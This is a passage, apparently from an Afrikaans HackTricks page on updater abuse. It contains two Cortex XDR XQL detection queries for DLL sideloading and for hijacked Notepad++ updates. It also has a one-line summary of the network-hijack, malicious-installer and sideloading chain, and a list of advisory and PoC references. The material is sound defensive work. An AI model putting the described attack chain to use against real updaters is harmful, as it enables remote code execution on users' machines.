- Notepad++ het gereageer deur WinGUp in v8.8.9 en later te versterk: die teruggestuurde XML word nou onderteken (XMLDSig), en nuwer weergawes dwing sertifikaat- én handtekeningverifikasie van die afgelaaide installeerder af, eerder as om net die vervoer te vertrou.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Sideloading van <code>log.dll</code> deur ’n EXE met ’n Bitdefender-handtekening (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> wat ’n nie-Notepad++-installeerder loods</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

Hierdie patrone geld vir enige updater wat unsigned manifests aanvaar of nie installer-ondertekenaars vaspen nie—network hijack + malicious installer + BYO-signed sideloading lei tot remote code execution onder die dekmantel van “trusted” updates.

---
## References
- [1] [Advies – Netskope Client for Windows – Plaaslike Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope-sekuriteitsadvies NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope-inprop](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC-kliënt/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre en Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – Plaaslike Privilege Escalation via skryfbare lêers in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Privilege escalation in Windows-agent](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – Nasiestaat-akteurs buit Notepad++ se voorsieningsketting uit](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – opdatering oor die insident met die gekaapte infrastruktuur](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – Om die regstelling vir CVE-2025-0309 in Netskope Client for Windows te omseil](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [15] [Atredis – Ontdekking van Privilege Escalation-foute in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)
{{#include ../../banners/hacktricks-training.md}}
